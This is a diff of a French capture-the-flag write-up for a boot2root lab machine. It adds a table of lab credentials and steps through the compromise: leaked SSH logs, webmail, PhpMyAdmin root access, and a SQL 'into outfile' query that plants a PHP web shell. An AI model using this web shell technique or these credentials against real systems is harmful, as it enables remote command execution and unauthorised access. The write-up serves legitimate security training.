@@ -1,5 +1,18 @@
 # WriteUp1
 
+## Password
+| Service    | User                 | Passwd                                                             |
+|------------|----------------------|--------------------------------------------------------------------|
+| serv       | user                 | `pass`                                                             | 
+| Forum      | laurie               | `!q\]Ej?*5K5cy*AJ`                                                 | 
+| Mail       | laurie@borntosec.net | `!q\]Ej?*5K5cy*AJ`                                                 | 
+| PhpMyAdmin | root                 | `Fg-'kKXBj87E:aJ$`                                                 | 
+| FTP        | lmezard              | `G!@M6f4Eatau{sF"`                                                 | 
+| SSH        | laurie               | `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` | 
+| SSH        | thor                 | `Publicspeakingisveryeasy.126241207201b2149opekmq426135`           | 
+| SSH        | zaz                  | `646da671ca01bb5d84dbb5fb2238dc8e`                                 | 
+
+## Forum
 - Je recupere les [logs du ssh](https://192.168.1.96/forum/index.php?id=6) sur le forum 
 - `python3 ssh_parse.py`
 <pre>
@@ -7,6 +20,8 @@
 </pre>
 - Je me connecte avec les login `laurie` et `!q\]Ej?*5K5cy*AJ`
 - le mail est disponible dans les parametres de l'user
+
+## Mail
 - Je me connecte au server imap avec `laurie@borntosec.net` et `!q\]Ej?*5K5cy*AJ` avec evolution ou sur le site [webmail](https://borntosec.net/webmail/)
 - Un mail est disponible
 <pre>
@@ -16,6 +31,8 @@ You cant connect to the databases now. Use <strong>root/Fg-'kKXBj87E:aJ$</strong
 
 Best regards.
 </pre>
+
+## PhpMyAdmin
 - On peut donc se connecter sur le [PhpMyAdmin](https://192.168.1.96/phpmyadmin/).
 - En changant le password de admin par celui de lmezard on peut se connecter en tant qu'admin sur le forum
 - J'essaye maintenant d'inserer un code php dans le serveur web pour qu'il soit executer par celui ci
@@ -30,7 +47,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 lmezard:G!@M6f4Eatau{sF"
 ```
 
-# Lmezard FTP
+## Lmezard FTP
 - On peut se connecter au FTP grace a ces login
 - On recupere les fichiers
 - On remarque que le fichier fun est une archive de plusieurs fichiers donc on le decompresse avec `tar -xf fun`
@@ -184,17 +201,15 @@ opekmq
 - Se qui donne en inversant les dernier caracteres:
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
-
-on le md5> 646da671ca01bb5d84dbb5fb2238dc8e
 ```
 
-
-
 ## turtle
-
-SLASH => md5
-voir script js
-
+- Il y a un fichier avec des instructions
+- En l'interpretant avec un script javascript, on voit que ca ecrit SLASH
+- En le convertissant en md5 cela donne:
+```
+646da671ca01bb5d84dbb5fb2238dc8e
+```
 
 ## Pour etre root
 
